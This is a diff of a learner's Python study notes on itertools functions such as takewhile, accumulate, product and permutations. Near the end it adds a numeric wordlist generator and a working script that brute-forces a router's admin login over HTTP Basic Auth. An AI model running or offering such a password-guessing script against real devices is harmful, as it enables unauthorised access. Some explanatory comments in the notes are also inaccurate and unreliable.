@@ -178,7 +178,8 @@ print(list(chain(["man","nan"], ["pan"]))) # output: [1, 3, 2, 3, 5, 9] ['man', 
 # it moves through the range one at a time ACCUMULATING as it processes. 
 # print(list(takewhile(lambda x: x<= 6, nums))) 
 # x is the placeholder for nums """ 
-# it will take the result of nums printed and print the sequence as long as the output is equal to or less than 6. the lambda is our parameter to set
+# it will take the result of nums printed and print the sequence as long as the output is equal to or less than 6. 
+# the lambda is our parameter to set
 
 # Example: 
 from itertools import takewhile,chain 
@@ -194,7 +195,8 @@ print(ch)   # [0, 1, 3, 6, 0, 1, 3, 6, 2, 1]
 
 
 # the difference between takewhile and filter 
-# filter goes through all the elements of the iterabele takewhile checks the condition as long as it is True. when it hit False, it exits the iterable.
+# filter goes through all the elements of the iterabele takewhile checks the condition as long as it is True. 
+# when it hit False, it exits the iterable.
 
 # print(list(takewhile(lambda x: x<=6, nums))) 
 # This takes the values of nums and puts them into the variable x one at a time. 
@@ -225,20 +227,213 @@ print(list(chain(accumulate(range(8)),takewhile(lambda x: x<= 6, nums))))   # [0
 
 # Example:
 from itertools import accumulate 
-def sigma(n): '''Returns sum of integers from 0 to n''' 
+def sigma(n): 
+# Returns sum of integers from 0 to n
     if n == 0: 
         return 0 
-    return n + sigma(n-1) lst1 = [sigma(i) for i in range(8)] 
-lst2 = list(accumulate(range(8))) print(lst1 == lst2)
+    return n + sigma(n-1) 
+
+lst1 = [sigma(i) 
+for i in range(8)] 
+lst2 = list(accumulate(range(8))) 
+print(lst1 == lst2) # True
+
+# range(8) = 0,1,2,3,4,5,6,7 
+# accumulate = 0,0+1,0+1+2,0+1+2+3,0+1+2+3+4,0+1+2+3+4+5,0+1+2+3+4+5+6,0+1+2+3+4+5+6+7
+
+
+# Example:  to take the numbers from the list while they are even, using the takewhile function.
+from itertools import takewhile
+
+nums = [2, 4, 6, 7, 9, 8]
+
+a = takewhile(lambda x: x%2==0, nums)       # Lambda: It's just a faster way to define a simple function in one line. 
+print(list(a))  # [2, 4, 6]
+
+# The code below is basically (lambda x: x%2==0, nums) --> the same as this def check_even(x) x%2==0 return x check_even(nums) 
+# it is to check and keep the even integers 
+# Why is the output not [2, 4, 6, 8]? 
+# The takewhile command will stop when it reaches the element that is not divisible by 2 to produce 0, 
+# in this case the input is: nums = [2, 4, 6, 7, 9, 8] 
+# it will stop at the 3rd element which is the integer 
+# Unless the command is filter which will filter out all elements divisible by 2 to produce 0, and the output will be: [2, 4, 6, 8]
+
+
+# Example:
+# To understand takewhile function you must see this: 
+nums = [2, 4, 6, 7, 9, 8] 
+a = filter(lambda x: x%2==0, nums) 
+print(list(a)) # [2,4,6,8] 
+# But with takewhile 
+from itertools import takewhile 
+nums = [2, 4, 6, 7, 9, 8] 
+a =takewhile(lambda x: x%2==0, nums)
+print(list(a)) # [2,4,6] 
+# takewhile function when see "7" number, it breaks. so you can see the difference between "filter" and "takewhile".
+
+# It seems the difference between filter and takewhile is that filter returns a list, 
+# but takewhile returns an iterator, which must be cast to a list in order to print it.
+
+# 8 is not in the output, because takewhile working while function remains true. 
+# When function get 7, it remains false. And takewhile stop takes items.
+
+# Takewhile function will take only till the function remains true, 
+# as soon as function becomes false it turns itself off and doesn't checks further. 
+# You can replace this "takewhile" function by "filter" function 
+# if you don't need takewhile's carelessness in your code to abandon itself as soon as condition goes off.
+
+
+# SECTION 3
+# There are also several combinatoric functions in itertool, such as product and permutation.
+# These are used when you want to accomplish a task with all possible combinations of some items.
+# Example:
+from itertools import product, permutations
+
+letters = ("A", "B")
+print(list(product(letters, range(2))))     # [('A', 0), ('A', 1), ('B', 0), ('B', 1)]
+print(list(permutations(letters)))          # [('A', 'B'), ('B', 'A')]
+
+# Itertools' permutation function may take two arguments, 
+# where the first one is the collection of elements 
+# to be permutated and the second is the number of elements each produced permutation has to have. 
+# For example with three elements to be processed, you might want to end up with all one-element, 
+# two-element or three-element permutations, respectively: 
+from itertools import product, permutations 
+
+letters = ("A", "B", "C") 
+print(list(permutations(letters, 1)))   # [('A',), ('B',), ('C',)]
+print(list(permutations(letters, 2)))   # [('A', 'B'), ('A', 'C'), ('B', 'A'), ('B', 'C'), ('C', 'A'), ('C', 'B')]
+print(list(permutations(letters, 3)))   # [('A', 'B', 'C'), ('A', 'C', 'B'), ('B', 'A', 'C'), ('B', 'C', 'A'), ('C', 'A', 'B'), ('C', 'B', 'A')]
+
+# Example:
+# permutations() has a second parameter specifying what size group to permutate. 
+# This example will explain: 
+from itertools import permutations 
+nums = (1, 2, 3) 
+print(list(permutations(nums)))     # [(1, 2, 3), (1, 3, 2), (2, 1, 3), (2, 3, 1), (3, 1, 2), (3, 2, 1)] 
+print(list(permutations(nums, 2)))  # [(1, 2), (1, 3), (2, 1), (2, 3), (3, 1), (3, 2)]
+
+# The product() function takes each combination of listA and listB: 
+from itertools import product 
+listA = ['X', 'Y'] 
+listB = [4, 2] 
+print(list(product(listA,listB))) # [('X',4),('X',2),('Y',4),('Y',2)]
+
+# For those familiar with set theory in math, the product function gives the Cartesian product of the two arguments. 
+# This means it creates one new set by taking the first value from the first set, pairing it with every value from the second set, 
+# and repeating the process with every other value from the first set. 
+# The permutation function takes a list as its input and then outputs all the distinguishably different combinations of the values of that list. 
+# Thus, the permutations of ABC are ABC, ACB, BAC, BCA, CAB, CBA.
+
+# Let me try to give an illustrative explanation of the "product"-function. 
+# We have two input arguments here: 
+# (1) letters = ('A','B') 
+# (2) range(2) giving us the values 0 and 1 
+# Now take a look at the following table: 
+# | 0 | 1 | <- values in 2nd arg. ---- A | A,0 | A,1 | - ---- |> possible combinations B | B,0 | B,1 | - ---- ^--- values in 1st argument 
+# As you can see "product" just combines every value of the 1st argument with the values of the 2nd argument. 
+# It does not compute any product between the values, as the name would suggest.
+
+# Example:
+from itertools import product, permutations ,combinations 
+print(list(product(("X","Y","Z"),("M","N","O"))))   # [('X','M'),('X','N'),('X','O'),('Y','M'),('Y','N'),('Y','O'),('Z','M'),('Z','N'),('Z','O')]
+print(list(combinations(("A","B","C") ,2)))         # [('A', 'B'), ('A', 'C'), ('B', 'C')]
+print(list(permutations(("A","B","C"),2)))          # [('A', 'B'), ('A', 'C'), ('B', 'A'), ('B', 'C'), ('C', 'A'), ('C', 'B')]
+
+# Product (to avoid nested for loops); A simple example From itertools import product 
+# Nested LOOPS 
+#for i in range (2): 
+# for j in range (3): 
+# print("{} * {} = {}" format (i, j, i * j)) 
+# Product for a, b in product (range (2), range (3)): print("{} * {} = {}" format (a, b, a * b)) 
+# In both cases, the output will be the same
+
+# Permutations and combinations are not the same, for the first you care about the order and for the second you don't..
+
+# Example: 
+letters = ('A', 'B')                    # range index starts from 0 
+print(list(product(letters,range(3))))  # [(A,0),(A,1),(A,2),(B,0),(B,1),(B,2)]
+
+
+# Example:
+from itertools import product
+a={1, 2}
+print(len(list(product(range(3), a))))      # 6
+# It is 6 because of following combinations (0,1)(1,1)(2,1) and (0,2) (1,2) (2,2) 
+# here it is (range,value) where range 0,1,2, and value is taken from num function that we provided 1,2
+
+# Explanation:
+a = [1,2] 
+# Range calc 
+print(list(range(3))) # [0,1,2] 
+# Product calc 
+print(list(product([0,1,2], [1,2] ))) # (0,1)(0,2)(1,1)(1,2)(2,1)(2,2) --> Return len # 6 --> the length of the list
+
+# Explanation:
+# len(list(product(range(3), a))) = 
+# len(list(product((0,1,2), a))) = 
+# len(list((0,1),(0,2),(1,1),(1,2),(2,1),(2,2))) = 
+# len[(0,1),(0,2),(1,1),(1,2),(2,1),(2,2)] = 6
+
+
+
+# Example: Word List Combinator - To create simple combination list. It will indicate "OS Error"
+"""
+Script generated "new_list" with possible combination values from "letters".
+For creating combinations used function product() from module itertools. 
+"""
+# Import module
+import itertools
+
+# 'letters' can contain your needful words
+letters = "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
+n = 8 # lenght of generated values
+
+# Creating wordlist
+file = open("wordlist.txt", "w")
+
+# Generate combinations and then write to "wordlist"
+for wl in itertools.product(letters, repeat = n):
+    file.write(''.join(wl) + "\n")
+"""
+Wordlist can be used for brute force. Check the code 'bruteForceRouter'.
+"""
+
+# Example: Brute Force Router
+"""
+This program taked passwords from your wordlist.txt 
+and then try brute force router.
+You can generate wordlist by using my code 'wordlistGenerator', check this ;)
+"""
+# Import 'requests' modules
+from requests.auth import HTTPBasicAuth
+import requests
+
+# Open and read file and after get to list 'words'
+file = open("wordlist.txt", "r")
+words = [line.rstrip('\n') for line in file]
+
+# In this case, using the function is optional
+def hts():
+    url = "http://192.168.0.1/" # Router local IP-adress
+    name = "admin" # Name of administrator user
     
-range(8) = 0,1,2,3,4,5,6,7 accumulate = 0,0+1,0+1+2,0+1+2+3,0+1+2+3+4,0+1+2+3+4+5,0+1+2+3+4+5+6,0+1+2+3+4+5+6+7
+    for i in words: # Get start brute force every value..
+        auth = HTTPBasicAuth(name,i) # 'i' is password from wordlist
+        try:
+            r = requests.get(url, auth=auth) # Try to get request from router using auth with pass 'i'
+            if r:
+                print("Success!\n" + "Password: " + i) # If password is correct, then stop brute force.
+                break
+            else:
+                pass # If pass uncorrect, then go to checking next pass
+        except:
+            print("Some error.. :c")
+    else:
+        print("Combinations not founded!") # If wordlist doesn't contain correct pass :c
+hts()
 
-
-https://www.sololearn.com/learning/1073/2466/5117/2
-
-
-        
-        
+# If this was interesting for you, get "plus" on this code.
 
 
 
